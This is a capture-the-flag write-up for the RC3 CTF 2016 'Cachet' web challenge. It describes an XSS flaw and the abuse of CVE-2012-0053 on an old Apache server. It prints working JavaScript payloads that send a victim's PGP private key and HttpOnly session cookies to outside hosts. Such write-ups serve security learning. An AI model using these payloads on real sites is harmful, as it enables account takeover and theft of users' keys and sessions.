#### Cachet, a web challenge from RC3 CTF 2016
---

Cachet was a messaging service where the user can send messages (encrypted on the client) to others. A PIN, verified by the server, is required before you can view an encrypted message. 

tl;dr: XSS the user to get their private key, abuse an old Apache server on another port to get the HttpOnly cookie and thus the encrypted flag.

We quickly found an XSS vulnerability in the PGP message itself. This is only sent to the client after the PIN is confirmed, but this turned out to be irrelevant.

Our first payload attempted to steal the PGP key by hooking `onkeypress`, but the bot did not trigger this, so we instead overwrote the `decryptMessage()` function:
```javascript
function decryptMessage() {
    $.ajax({
      url: "http://xx.xx.xx.xx/recv.php",
      data: {x: $("#privkey").val(), y: $("#msg-subject").val()},
    });
}
```

Having the private key, we now needed the message to decrypt. After retrieving the list of messages from `read.php`, we saw the flag was in message #2 and the PIN was Julian Assange's birthday (as indicated by their subjects). We first tried simply retrieving message #2, but the application checked the `Referer` header to ensure the request was coming from the right page. Since we were coming from a different message, this check was failing. You cannot overwrite the `Referer` header in an AJAX request, and the cookies were marked HttpOnly, so we were temporarily stuck.

Eventually, we discovered a development server running on port 8080. While this was a non-functional version of the application, it was running an old version of Apache. It also had an `Access-Control-Allow-Origin` header set to the original site, allowing us to make AJAX requests (with cookies!) to it. This particular version of Apache was vulnerable to CVE-2012-0053, a vulnerability that will echo back sent cookies if you exceed Apache's header size limit. This allowed us to compromise the session cookie, which is marked HttpOnly, for the user using a modified exploit:
```javascript
function setCookies (good) {
    // Construct string for cookie value
    var str = "";
    for (var i=0; i< 819; i++) {
        str += "x";
    }
    // Set cookies
    for (i = 0; i < 10; i++) {
        // Expire evil cookie
        if (good) {
            var cookie = "xss"+i+"=;expires="+new Date(+new Date()-1).toUTCString()+"; path=/;";
        }
        // Set evil cookie
        else {
            var cookie = "xss"+i+"="+str+";path=/";
        }
        document.cookie = cookie;
    }
}
 
function makeRequest() {
    setCookies();
 
    function parseCookies () {
        var cookie_dict = {};
        // Only react on 400 status
        if (xhr.readyState === 4 && xhr.status === 400) {
            // Replace newlines and match <pre> content
            var content = xhr.responseText.replace(/\r|\n/g,'').match(/<pre>(.+)<\/pre>/);
            if (content.length) {
                // Remove Cookie: prefix
                content = content[1].replace("Cookie: ", "");
                var cookies = content.replace(/xss\d=x+;?/g, '').split(/;/g);
                // Add cookies to object
                for (var i=0; i<cookies.length; i++) {
                    var s_c = cookies[i].split('=',2);
                    cookie_dict[s_c[0]] = s_c[1];
                }
            }
            // Unset malicious cookies
            setCookies(true);
            $.ajax({
              data: {c: JSON.stringify(cookie_dict)},
              url: "http://ec2-xx-xx-xx-xx.compute-1.amazonaws.com/c.php",
            });
        }
    }
    // Make XHR request
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = parseCookies;
    xhr.open("GET", "http://54.172.225.153:8000", true);
    xhr.withCredentials = true;
    xhr.send(null);
}
 
makeRequest();
```

This sent us the cookie for the user, allowing us to read the message (which contained the flag) and decrypt it with the previously stolen key.
